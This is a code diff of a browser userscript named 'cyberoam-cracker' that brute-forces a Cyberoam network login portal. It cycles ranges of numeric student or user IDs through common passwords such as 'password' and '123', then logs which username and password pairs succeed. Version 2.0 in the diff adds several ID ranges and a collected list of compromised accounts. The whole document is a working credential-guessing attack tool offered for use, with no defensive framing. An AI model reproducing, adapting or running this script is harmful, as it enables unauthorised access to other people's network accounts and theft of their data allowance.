@@ -1,7 +1,7 @@
 // ==UserScript==
 // @name         cyberoam-cracker
 // @namespace    http://tampermonkey.net/
-// @version      0.1
+// @version      2.0
 // @description  Breaking The Rules
 // @author       You
 // @match        http://175.16.89.16:8888/                    <------Edit Here
@@ -9,26 +9,26 @@
 // @require      https://code.jquery.com/jquery-3.2.1.slim.min.js
 // ==/UserScript==
 
-
-
 (function() {
     'use strict';
-    
-    var passes = ["hello123","zxcvbnm","asdfghjkl","123","xyz","/","123456789","password","123456"];      //<-----Passwords Here.
-    var startId = 131001;                                                 //<-----Starting ID Here.
-    var endId = 131890;                                                   //<-----Ending ID Here.
-    
-    
-    
+
+    var passes = ["hello","qwerty","qaz","123","password"];      //<-----Passwords Here.
+    var startId = [141001,151001,161001,171001];                  //<-----Starting ID Here.
+    var endId = [141900,151900,161900,171900];                    //<-----Ending ID Here.
+
+
     //Do Not Change Below.
-    
+
     var ids = "";
+    var final = '';
     var passCount = passes.length;
+    var idCount = startId.length;
+    var loc2 = -1;
     var loc = -1;
     var usernameInput = $('input[name=username]');
     var passwordInput = $('input[name=password]');
     var loginButton = $('input[name=btnSubmit]');
-    
+
     function doWork(uname,upass){
         usernameInput.val(uname);
         passwordInput.val(upass);
@@ -39,40 +39,54 @@
             txt = $("#msgDiv").find("xmp").text();
             if(txt == "You have successfully logged in" || txt == "You have reached Maximum Login Limit." || txt == "Your data transfer has been exceeded, Please contact the administrator"){    //Add other conditions
                 ids += upass + " : " + uname + "\n";
+                final += '"' + uname + '",';
                 if(txt == "You have successfully logged in")
                     $('input[name=btnSubmit]').click();
             }
-        },400);
+        },450);
     }
-    
+
     function getWorkDone(callback) {
-        var u = startId;
+        var u = startId[loc2];
         var interval = setInterval(function(){
               doWork(u,passes[loc]);
-              if(u==endId+1){
+              if(u==endId[loc2]){
+                  loc++;
+                  u=startId[loc2]-1;
+              }
+              if(loc2==idCount)
+              {
                   clearInterval(interval);
                   callback();
               }
+              if(loc==passCount){
+                  loc=0;
+                  loc2++;
+                  u=startId[loc2]-1;
+              }
               $('body').keypress(function(e){    //Stops function when you press space.
                  if(e.keyCode == 32){
-                      clearInterval(interval);
-                     alert(ids);
+                     clearInterval(interval);
+                     prompt(ids,final);
                  }
               });
               u++;
           },600);
     }
-    
+
     function main(){
-        if(loc==passCount-1)
-            alert(ids);
-        else{
-            ++loc;
-            getWorkDone(function(){main();});
+        if(loc2==idCount){
+            prompt(ids,final);
         }
+      /** else{
+            ++loc;
+            loc2=0;
+            getWorkDone(function(){main();});
+        }*/
     }
     ++loc;
+    loc2=0;
     getWorkDone(function(){main();});
 
-    
+
 })();
